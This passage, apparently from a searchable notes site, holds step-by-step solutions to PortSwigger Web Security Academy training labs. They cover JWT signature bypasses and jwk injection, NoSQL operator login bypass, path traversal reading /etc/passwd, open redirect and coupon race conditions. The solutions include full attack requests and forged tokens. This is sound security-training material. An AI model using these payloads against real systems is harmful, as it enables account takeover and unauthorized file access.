attachment; filename=\"1.txt\"\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 520\n\nCONNECTED: -- Now chatting with Hal Pline --\nYou: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one\nHal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.\nYou: Wow you're so nice, thanks. I've heard from other people that you can be a right ****\nHal Pline: Takes one to know one\nYou: Ok so my password is 4vtfrzk4f8dgw362vt9v. Is that right?\nHal Pline: Yes it is!\nYou: Ok thanks, bye!\nHal Pline: Do one!\n</code></pre> <p>Log in as carlos to solve the lab.</p>","path":["Resources","Labs","PortSwigger","Authorization","Insecure direct object references"],"tags":["authz"]},{"location":"Resources/Labs/PortSwigger/DOM-Based/dom-lab-4/","level":1,"title":"DOM-based open redirection","text":"","path":["Resources","Labs","PortSwigger","DOM Based","DOM-based open redirection"],"tags":["dom","open-redirect"]},{"location":"Resources/Labs/PortSwigger/DOM-Based/dom-lab-4/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.</p>","path":["Resources","Labs","PortSwigger","DOM Based","DOM-based open redirection"],"tags":["dom","open-redirect"]},{"location":"Resources/Labs/PortSwigger/DOM-Based/dom-lab-4/#solution","level":2,"title":"Solution","text":"<p>On any blog post, notice that there is a link on the bottom of the page to navigate \"Back to Blog\".</p> <p></p> <p>Clicking that link and reviewing the response shows the following in the \"onclick\" attribute of the anchor tag:</p> <p></p> <p>So we can potentially add a <code>url</code> parameter to the request pointing to an address under our control. To solve this lab, point to the exploit server URL.</p> <p></p> <p>This solves the lab.</p>","path":["Resources","Labs","PortSwigger","DOM Based","DOM-based open redirection"],"tags":["dom","open-redirect"]},{"location":"Resources/Labs/PortSwigger/DOM-Based/dom-lab-4/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>Always check responses carefully to identify additional parameters.</p>","path":["Resources","Labs","PortSwigger","DOM Based","DOM-based open redirection"],"tags":["dom","open-redirect"]},{"location":"Resources/Labs/PortSwigger/JWT/jwt-lab-1/","level":1,"title":"JWT authentication bypass via unverified signature","text":"","path":["Resources","Labs","PortSwigger","JWT","JWT authentication bypass via unverified signature"],"tags":["jwt"]},{"location":"Resources/Labs/PortSwigger/JWT/jwt-lab-1/#instructions","level":2,"title":"Instructions","text":"<p>This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives.</p> <p>To solve the lab, modify your session token to gain access to the admin panel at <code>/admin</code>, then delete the user <code>carlos</code>.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>","path":["Resources","Labs","PortSwigger","JWT","JWT authentication bypass via unverified signature"],"tags":["jwt"]},{"location":"Resources/Labs/PortSwigger/JWT/jwt-lab-1/#solution","level":2,"title":"Solution","text":"<p>Oops</p> <p>I didn't actually need to do a \"none\" attack for this lab. I could have just modified the claim and it would have worked. My bad.</p> <p>Note that when we log in, the application response sets a session cookie containing a JWT.</p> Initial login<pre><code>POST /login HTTP/1.1\nHost: 0a710037039dbd7b806edf7600ba006d.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 68\nOrigin: https://0a710037039dbd7b806edf7600ba006d.web-security-academy.net\nConnection: keep-alive\nReferer: https://0a710037039dbd7b806edf7600ba006d.web-security-academy.net/login\nCookie: session=\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: magenta\nPriority: u=0, i\n\ncsrf=5Ydx3dB54Cj0NqCzxKoWJPuChby9gwAU&amp;username=wiener&amp;password=peter\n</code></pre> Initial response<pre><code>HTTP/1.1 302 Found\nLocation: /my-account?id=wiener\nSet-Cookie: session=eyJraWQiOiI0MzhkY2UxMy1iN2VmLTQyNjctYjNiZS00ZGM3MWUyNTIyMmQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MzE1MjUxNCwic3ViIjoid2llbmVyIn0.Kh7zwr8S6dlqGB5q0IoCNaOFwjywtwbG8zKisZmQyHUM9nKFEwR8dV13upszlS-8sOu8869fuDGZjowEqYTX0NW3yAbCSRHie6bjcdMlsaK-rkaEKi78dsSDQCGdoXCQoDG6fH41v1V1HHWEfSj-9w2ZcA4lHoErt8eS5tPgTj9fSCSJxf39b62U_sOmR166lVVmvC6qvk2zkm9JPUXklggdOcJFA-v2bsOXWNOqHAImx9denNl9cCE9bPB9yE4X18qp8lxryFGFXZ6-wcxcSwK-DtawfwxJY3-0cRwlzqrjQvSnftF0j6eZHrfstrDNQ5Bbya_pqWiYzLQBnPE9lw; Secure; HttpOnly; SameSite=None\nX-Frame-Options: SAMEORIGIN\nContent-Encoding: gzip\nConnection: close\nContent-Length: 0\n</code></pre> <p>The following shows the decoded JWT:</p> <p></p> <p>We can use a \"none\" algorithm attack to see if the application will accept a JWT with no signature. </p> <p>The following shows the updated token. Note that I changed the user from \"wiener\" to \"administrator\".</p> <p></p> <p>Swapping out that new token in replay and changing the account id from \"wiener\" to \"administrator\" in the query string works for accessing the administrator's account. </p> <p></p> <p>Now we can access the /admin/delete endpoint, and can delete carlos to solve the lab. </p> Final request to delete carlos<pre><code>GET /admin/delete?username=carlos HTTP/1.1\nHost: 0a710037039dbd7b806edf7600ba006d.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0a710037039dbd7b806edf7600ba006d.web-security-academy.net/login\nConnection: keep-alive\nCookie: session=eyJraWQiOiI0MzhkY2UxMy1iN2VmLTQyNjctYjNiZS00ZGM3MWUyNTIyMmQiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MzE1MjUxNCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: magenta\nPriority: u=0, i\n</code></pre> <p>This solves the lab.</p>","path":["Resources","Labs","PortSwigger","JWT","JWT authentication bypass via unverified signature"],"tags":["jwt"]},{"location":"Resources/Labs/PortSwigger/JWT/jwt-lab-1/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>Always check if the application is validating the JWT signature. Can we modify claims without having a valid signing key?</p>","path":["Resources","Labs","PortSwigger","JWT","JWT authentication bypass via unverified signature"],"tags":["jwt"]},{"location":"Resources/Labs/PortSwigger/JWT/jwt-lab-2/","level":1,"title":"JWT authentication bypass via flawed signature verification","text":"","path":["Resources","Labs","PortSwigger","JWT","JWT authentication bypass via flawed signature verification"],"tags":["jwt"]},{"location":"Resources/Labs/PortSwigger/JWT/jwt-lab-2/#instructions","level":2,"title":"Instructions","text":"<p>This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.</p> <p>To solve the lab, modify your session token to gain access to the admin panel at <code>/admin</code>, then delete the user <code>carlos</code>.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>","path":["Resources","Labs","PortSwigger","JWT","JWT authentication bypass via flawed signature verification"],"tags":["jwt"]},{"location":"Resources/Labs/PortSwigger/JWT/jwt-lab-2/#solution","level":2,"title":"Solution","text":"<p>Notice that after logging in a cookie is set that contains a JWT.</p> Initial login<pre><code>POST /login HTTP/1.1\nHost: 0a8e00b6043d305881f398dd00ba00ad.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 68\nOrigin: https://0a8e00b6043d305881f398dd00ba00ad.web-security-academy.net\nConnection: keep-alive\nReferer: https://0a8e00b6043d305881f398dd00ba00ad.web-security-academy.net/login\nCookie: session=\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: magenta\nPriority: u=0, i\n\ncsrf=SvlyMVemVivhHcVPrwzc3lM2riaZeaA7&amp;username=wiener&amp;password=peter\n</code></pre> Initial response<pre><code>HTTP/1.1 302 Found\nLocation: /my-account?id=wiener\nSet-Cookie: session=eyJraWQiOiI0ZTMyMTI4YS1iZTVkLTQzMDYtYWMyMS0xYTRiZDI5ZjZkNDUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MzE1MzcwMywic3ViIjoid2llbmVyIn0.i0jz_z3igJOq324sJKAWUEzAEMK3mqo1lupgdC8TZrE42cT0B3ajfwsi6A_BsgY9i7LI91RHxjm3Se-2h04-jjrC2BPu4o4rYoaJ03NSoDT9EZuotN9ab8I5hZFwU2tV4nitG7YNCQ8zPdxtB3rzCoZ1VSi619jpGFFuoc0lDb-Wm2iN_iL5caGNs8yg4mn1akTJP-rB68Y_zJEN79rP7HcmqcX-TQSFEap0cMJu2fthYJ7eHXuiRhhNlQevZ2cm0HqVlBZlxZPpeo7ebbZJNesiwhtYIOw4ZZEXrdGJ5UHQexe8xM9kUaWSSXk2UlERQpqsiGQpOJdb0WIomvoO_g; Secure; HttpOnly; SameSite=None\nX-Frame-Options: SAMEORIGIN\nContent-Encoding: gzip\nConnection: close\nContent-Length: 0\n</code></pre> <p>Execute a \"none\" algorithm attack again, change the sub value from \"wiener\" to \"administrator\", and drop it in a previous request.</p> <p>Send the following request with the new JWT</p> Request to delete carlos<pre><code>GET /admin/delete?username=carlos HTTP/1.1\nHost: 0a8e00b6043d305881f398dd00ba00ad.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0a8e00b6043d305881f398dd00ba00ad.web-security-academy.net/login\nConnection: keep-alive\nCookie: session=eyJraWQiOiI0ZTMyMTI4YS1iZTVkLTQzMDYtYWMyMS0xYTRiZDI5ZjZkNDUiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MzE1MzcwMywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: magenta\nPriority: u=0, i\n</code></pre>","path":["Resources","Labs","PortSwigger","JWT","JWT authentication bypass via flawed signature verification"],"tags":["jwt"]},{"location":"Resources/Labs/PortSwigger/JWT/jwt-lab-2/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>Check if it's possible to change the algorithm to none.</p>","path":["Resources","Labs","PortSwigger","JWT","JWT authentication bypass via flawed signature verification"],"tags":["jwt"]},{"location":"Resources/Labs/PortSwigger/JWT/jwt-lab-3/","level":1,"title":"JWT authentication bypass via jwk header injection","text":"","path":["Resources","Labs","PortSwigger","JWT","JWT authentication bypass via jwk header injection"],"tags":["jwt"]},{"location":"Resources/Labs/PortSwigger/JWT/jwt-lab-3/#instructions","level":2,"title":"Instructions","text":"<p>This lab uses a JWT-based mechanism for handling sessions. The server supports the <code>jwk</code> parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source.</p> <p>To solve the lab, modify and sign a JWT that gives you access to the admin panel at <code>/admin</code>, then delete the user <code>carlos</code>.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>","path":["Resources","Labs","PortSwigger","JWT","JWT authentication bypass via jwk header injection"],"tags":["jwt"]},{"location":"Resources/Labs/PortSwigger/JWT/jwt-lab-3/#solution","level":2,"title":"Solution","text":"<p>This lab also sets a JWT in a session cookie. </p> <p>We'll solve this lab using jwt_tool. </p> <p>The following command will inject an inline JWK header:</p> Using jwt_tool to inject an inline JWK<pre><code>➜ jwt_tool eyJraWQiOiI5NzY5YTY4Ny05ZTU5LTRkZTQtOTZiOS04ODA2YzA3NWU5YjYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MzE1NDk3OCwic3ViIjoid2llbmVyIn0.CqbMWeNo1M9lvNiaaABD_3mMk_MmgWkvhsvFv-tSJ089oWEvrErDHgGm27YjUkJJCnxcQbefvm2dlhdJifLkovn5WKCJvkfn2rWyI6fJ9-IoMwXLLPSBf11CTaEa0qW3JlTXi9-gjqP72KqSWEytbrssXwYzza6rIo6PKkx7p1RWLu7F9LzY1I7KVxlQ9OPvzdQh0lwaIPxg0ncbJg-APuuhPT6vWZ-sAZoGlFp7ojLXFyI1p-rlIr4eR903OA2ZUiimEBJsTDI6BwwaFB4ar69uH503wYNoS8OchwMR9OO6dZdkGnTouIINwvRndO05-8tdbUXJgDqdmGoPsD2icA -T -X i\nWARNING: The requested image's platform (linux/amd64) does not match the detected host platform (linux/arm64/v8) and no specific platform was requested\n\n        \\   \\        \\         \\          \\                    \\\n   \\__   |   |  \\     |\\__    __| \\__    __|                    |\n         |   |   \\    |      |          |       \\         \\     |\n         |        \\   |      |          |    __  \\     __  \\    |\n  \\      |      _     |      |          |   |     |   |     |   |\n   |     |     / \\    |      |          |   |     |   |     |   |\n\\        |    /   \\   |      |          |\\        |\\        |   |\n \\______/ \\__/     \\__|   \\__|      \\__| \\______/  \\______/ \\__|\n Version 2.3.0                \\______|             @ticarpi\n\n/root/.jwt_tool/jwtconf.ini\nOriginal JWT:\n\n\n====================================================================\nThis option allows you to tamper with the header, contents and\nsignature of the JWT.\n====================================================================\n\nToken header values:\n[1] kid = \"9769a687-9e59-4de4-96b9-8806c075e9b6\"\n[2] alg = \"RS256\"\n[3] *ADD A VALUE*\n[4] *DELETE A VALUE*\n[0] Continue to next step\n\nPlease select a field number:\n(or 0 to Continue)\n&gt; 0\n\nToken payload values:\n[1] iss = \"portswigger\"\n[2] exp = 1763154978    ==&gt; TIMESTAMP = 2025-11-14 21:16:18 (UTC)\n[3] sub = \"wiener\"\n[4] *ADD A VALUE*\n[5] *DELETE A VALUE*\n[6] *UPDATE TIMESTAMPS*\n[0] Continue to next step\n\nPlease select a field number:\n(or 0 to Continue)\n&gt; 3\n\nCurrent value of sub is: wiener\nPlease enter new value and hit ENTER\n&gt; administrator\n[1] iss = \"portswigger\"\n[2] exp = 1763154978    ==&gt; TIMESTAMP = 2025-11-14 21:16:18 (UTC)\n[3] sub = \"administrator\"\n[4] *ADD A VALUE*\n[5] *DELETE A VALUE*\n[6] *UPDATE TIMESTAMPS*\n[0] Continue to next step\n\nPlease select a field number:\n(or 0 to Continue)\n&gt; 0\nkey: /root/.jwt_tool/jwttool_custom_private_RSA.pem\njwttool_f67b9f83be144cd371df2f15d45a01c9 - EXPLOIT: injected JWKS\n(This will only be valid on unpatched implementations of JWT.)\n[+] eyJraWQiOiJqd3RfdG9vbCIsImFsZyI6IlJTMjU2IiwiandrIjp7Imt0eSI6IlJTQSIsImtpZCI6Imp3dF90b29sIiwidXNlIjoic2lnIiwiZSI6IkFRQUIiLCJuIjoidTV2M2V3YzF3YzNONS12VXNqWUREQ0VKWDVOeFBaX0JuaHZWNnhRZTNQUlZfNWpMa0ppdDZNYUlDU0lBODNUMG5oVUJsaGVoTGhvdWV3Qkl6ZXh0SDB2NlpOZUhiQVZDN3ZpUnpCZ2dpcHJvdWZsLW55b1ktQ3JnQWZOeEZGUXVCRXJWY1kwTUs4QTczQjZ6ek8tZXhFb0dGajhSbGgxWVpmVDNCNHhyWEdabjhIMkNyQU8yMko2YjFoQy0wQ0huRkZTVWQ3UlVkekh1YW1MZDF4RkFCRkdDYnFXZkk0SWZrOU14N0ROWmkzbm9oRVdGUzFZZ0hocGtRcFVjV0UtTDRSbjNLUWU4cUs0cW5jQlFYOEp2QkoxbWJqLTJYWHctbkhmQlllUkVQanJPdWhzNjBoYkRjQnJaenVrcXc5bGhEZVFJMHVDWGk2Z2V0UFF0ZDY2V3RRIn19.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MzE1NDk3OCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.idwmoyl8dxt36W0ULWLiZUUDqv-wXAoTEG1pduhJBicgMaax8IWHv_pqx9deE67gTDkOq19B4mvDRJUlOQxwaPUaiCicgHPsJ1zXoAwlYYx0fIxa6l9AFd0cS3KVEOSq2WJbk4xCSMKNps7e4as-drO9z1H41YAa_1hrmymqEU2WDvsStRX4WI2lSL_D9HA6Jpt_-AvVrq05CWyvomJolVc_iA5WKhlNr4w8dx0geojmQEcUFCbdXwOw0ben3LWo890iEy77o5VJbjpDKbNWcOtNmXpXAJ2Gb81bzx_Tm3q0ImitwSSOW34r7bvqAKHPAFkeyZYG3sCrZTDsXoqGLw\n</code></pre> <p>The new JWT looks like this:</p> <p></p> <p>Pasting that new JWT into a previous request works and we can access the /admin/delete endpoint and delete the carlos user.</p> <p></p>","path":["Resources","Labs","PortSwigger","JWT","JWT authentication bypass via jwk header injection"],"tags":["jwt"]},{"location":"Resources/Labs/PortSwigger/JWT/jwt-lab-3/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>Check if a user-provided JWK header will be accepted by the application. </p>","path":["Resources","Labs","PortSwigger","JWT","JWT authentication bypass via jwk header injection"],"tags":["jwt"]},{"location":"Resources/Labs/PortSwigger/NoSQL-Injection/nosql-lab-2/","level":1,"title":"Exploiting NoSQL operator injection to bypass authentication","text":"","path":["Resources","Labs","PortSwigger","NoSQL Injection","Exploiting NoSQL operator injection to bypass authentication"],"tags":["nosql"]},{"location":"Resources/Labs/PortSwigger/NoSQL-Injection/nosql-lab-2/#instructions","level":2,"title":"Instructions","text":"<p>The login functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection using MongoDB operators.</p> <p>To solve the lab, log into the application as the <code>administrator</code> user.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code>.</p>","path":["Resources","Labs","PortSwigger","NoSQL Injection","Exploiting NoSQL operator injection to bypass authentication"],"tags":["nosql"]},{"location":"Resources/Labs/PortSwigger/NoSQL-Injection/nosql-lab-2/#solution","level":2,"title":"Solution","text":"<p>Try to log in with the username <code>administrator</code> and any password. Note that you get a failed login message. </p> <p>Send the login request to repeater.</p> <p>Modify the request as follows:</p> Modified NoSQL request<pre><code>POST /login HTTP/1.1\nHost: 0a6700540464fd65805b5d37000100ab.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0a6700540464fd65805b5d37000100ab.web-security-academy.net/login\nContent-Type: application/json\nContent-Length: 50\nOrigin: https://0a6700540464fd65805b5d37000100ab.web-security-academy.net\nConnection: keep-alive\nCookie: session=yqgMFKE031qO9DBnRKYkECycybQTx1OG\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: magenta\nPriority: u=0\n\n{\"username\":{\"$regex\":\"admin.*\"},\"password\":{\"$ne\":\"\"}}\n</code></pre> <p>This works and we're able to get into the admin account.</p> <p></p>","path":["Resources","Labs","PortSwigger","NoSQL Injection","Exploiting NoSQL operator injection to bypass authentication"],"tags":["nosql"]},{"location":"Resources/Labs/PortSwigger/Path-Traversal/path-traversal-lab-1/","level":1,"title":"File path traversal, simple case","text":"","path":["Resources","Labs","PortSwigger","Path Traversal","File path traversal, simple case"],"tags":["path-traversal"]},{"location":"Resources/Labs/PortSwigger/Path-Traversal/path-traversal-lab-1/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a path traversal vulnerability in the display of product images.</p> <p>To solve the lab, retrieve the contents of the <code>/etc/passwd</code> file.</p>","path":["Resources","Labs","PortSwigger","Path Traversal","File path traversal, simple case"],"tags":["path-traversal"]},{"location":"Resources/Labs/PortSwigger/Path-Traversal/path-traversal-lab-1/#solution","level":2,"title":"Solution","text":"<p>When we first access the lab, notice how the images are loaded.</p> How are the images loaded?<pre><code>GET /image?filename=9.jpg HTTP/1.1\nHost: 0af5009504f8b49b8042770700cd00c6.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nConnection: keep-alive\nReferer: https://0af5009504f8b49b8042770700cd00c6.web-security-academy.net/\nCookie: session=KSPI74XXUKySfZDX7aiAdN07PzPaMrWt\nSec-Fetch-Dest: image\nSec-Fetch-Mode: no-cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: orange\nPriority: u=5, i\n</code></pre> <p>Send this request to repeater.</p> <p>We can use a basic path traversal sequence (<code>../</code>) to navigate \"up\" out of the current directory to the root of the file system and access the <code>/etc/passwd</code> file as shown below. In this case, there are no filters in place to prevent this.</p> <p></p> <p>This solves the lab.</p>","path":["Resources","Labs","PortSwigger","Path Traversal","File path traversal, simple case"],"tags":["path-traversal"]},{"location":"Resources/Labs/PortSwigger/Path-Traversal/path-traversal-lab-1/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>Whenever you see a file being retrieved like this, try to see if you can load other files by navigating out of the current directory using a path traversal sequence. </p>","path":["Resources","Labs","PortSwigger","Path Traversal","File path traversal, simple case"],"tags":["path-traversal"]},{"location":"Resources/Labs/PortSwigger/Path-Traversal/path-traversal-lab-2/","level":1,"title":"File path traversal, traversal sequences blocked with absolute path bypass","text":"","path":["Resources","Labs","PortSwigger","Path Traversal","File path traversal, traversal sequences blocked with absolute path bypass"],"tags":["path-traversal"]},{"location":"Resources/Labs/PortSwigger/Path-Traversal/path-traversal-lab-2/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a path traversal vulnerability in the display of product images.</p> <p>The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.</p> <p>To solve the lab, retrieve the contents of the <code>/etc/passwd</code> file.</p>","path":["Resources","Labs","PortSwigger","Path Traversal","File path traversal, traversal sequences blocked with absolute path bypass"],"tags":["path-traversal"]},{"location":"Resources/Labs/PortSwigger/Path-Traversal/path-traversal-lab-2/#solution","level":2,"title":"Solution","text":"<p>Once again, note how the images are being loaded by reviewing the request in your proxy.</p> Images being loaded<pre><code>GET /image?filename=51.jpg HTTP/1.1\nHost: 0a1700a70458b4f380078b6b00b30057.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nConnection: keep-alive\nReferer: https://0a1700a70458b4f380078b6b00b30057.web-security-academy.net/\nCookie: session=raYLupTJtiMAXdJHwauhLSzQ1SN2uqiu\nSec-Fetch-Dest: image\nSec-Fetch-Mode: no-cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: orange\nPriority: u=5, i\n</code></pre> <p>However, this time if we try the same basic path traversal sequence we're blocked.</p> <p></p> <p>Since this lab treats the provided file name as being relative to a default working directory, we can just replace the filename with <code>/etc/passwd</code> to get the contents of the passwd file and solve the lab. </p> <p></p>","path":["Resources","Labs","PortSwigger","Path Traversal","File path traversal, traversal sequences blocked with absolute path bypass"],"tags":["path-traversal"]},{"location":"Resources/Labs/PortSwigger/Path-Traversal/path-traversal-lab-2/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>Always try to access the file directly. This is probably a good first check. </p>","path":["Resources","Labs","PortSwigger","Path Traversal","File path traversal, traversal sequences blocked with absolute path bypass"],"tags":["path-traversal"]},{"location":"Resources/Labs/PortSwigger/Path-Traversal/path-traversal-lab-3/","level":1,"title":"File path traversal, validation of start of path","text":"","path":["Resources","Labs","PortSwigger","Path Traversal","File path traversal, validation of start of path"],"tags":["path-traversal"]},{"location":"Resources/Labs/PortSwigger/Path-Traversal/path-traversal-lab-3/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a path traversal vulnerability in the display of product images.</p> <p>The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.</p> <p>To solve the lab, retrieve the contents of the <code>/etc/passwd</code> file.</p>","path":["Resources","Labs","PortSwigger","Path Traversal","File path traversal, validation of start of path"],"tags":["path-traversal"]},{"location":"Resources/Labs/PortSwigger/Path-Traversal/path-traversal-lab-3/#solution","level":2,"title":"Solution","text":"<p>Notice that this lab includes the full path in the request.</p> Full path is included<pre><code>GET /image?filename=/var/www/images/23.jpg HTTP/1.1\nHost: 0a3300bf036250d480e5940f00630015.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nConnection: keep-alive\nReferer: https://0a3300bf036250d480e5940f00630015.web-security-academy.net/\nCookie: session=3p7nurOK3wQCWh3r8GQdS8pKrUVDDZt4\nSec-Fetch-Dest: image\nSec-Fetch-Mode: no-cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: orange\nPriority: u=5, i\n</code></pre> <p>Notice that if we try to replace the entire path with only the path traversal sequences and the target file name, the application complains about it.</p> <p></p> <p>This suggests that we probably need the full path there.</p> <p>Since the application is validating that the start of the path, we know that we need to navigate back up three directories to the root directory to access the <code>/etc/passwd</code> file. </p> <p></p> <p>This solves the lab. </p>","path":["Resources","Labs","PortSwigger","Path Traversal","File path traversal, validation of start of path"],"tags":["path-traversal"]},{"location":"Resources/Labs/PortSwigger/Path-Traversal/path-traversal-lab-3/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>Check to see if the application is validating the start of the path. If so, include that in the request and traverse from there. </p>","path":["Resources","Labs","PortSwigger","Path Traversal","File path traversal, validation of start of path"],"tags":["path-traversal"]},{"location":"Resources/Labs/PortSwigger/Race-Conditions/race-lab-1/","level":1,"title":"Limit overrun race conditions","text":"","path":["Resources","Labs","PortSwigger","Race Conditions","Limit overrun race conditions"],"tags":["race-conditions","limit-overrun"]},{"location":"Resources/Labs/PortSwigger/Race-Conditions/race-lab-1/#instructions","level":2,"title":"Instructions","text":"<p>This lab's purchasing flow contains a race condition that enables you to purchase items for an unintended price.</p> <p>To solve the lab, successfully purchase a Lightweight L33t Leather Jacket.</p> <p>You can log in to your account with the following credentials: <code>wiener:peter</code>.</p> <p>For a faster and more convenient way to trigger the race condition, we recommend that you solve this lab using the Trigger race conditions custom action. This is only available in Burp Suite Professional.</p>","path":["Resources","Labs","PortSwigger","Race Conditions","Limit overrun race conditions"],"tags":["race-conditions","limit-overrun"]},{"location":"Resources/Labs/PortSwigger/Race-Conditions/race-lab-1/#solution","level":2,"title":"Solution","text":"<p>Note the request when adding the coupon code on the checkout screen:</p> Adding the coupon code<pre><code>POST /cart/coupon HTTP/2\nHost: 0aa100a50379543b800bbd220071002f.web-security-academy.net\nCookie: session=fpb8bEw3eNqSn0xbJTeATjn9TAwrbtHC\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 52\nOrigin: https://0aa100a50379543b800bbd220071002f.web-security-academy.net\nReferer: https://0aa100a50379543b800bbd220071002f.web-security-academy.net/cart\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-Pwnfox-Color: magenta\nPriority: u=0, i\nTe: trailers\n\ncsrf=Bz9HFt7nDfwgVx9dpBW57fCQqqhU6LcB&amp;coupon=PROMO20\n</code></pre> <p>Remove the coupon and then send this request (the one where we're adding the coupon code) to repeater.</p> <p>In repeater (Burp Pro), select \"Custom actions\"</p> <p></p> <p>Select New -&gt; From Template and then select Trigger race condition.</p> <p></p> <p>Once that's done, click the \"play\" icon back in repeater. </p> <p></p> <p>You'll find that the coupon has been applied many times, and you're able to purchase the jacket with your available store credit. </p>","path":["Resources","Labs","PortSwigger","Race Conditions","Limit overrun race 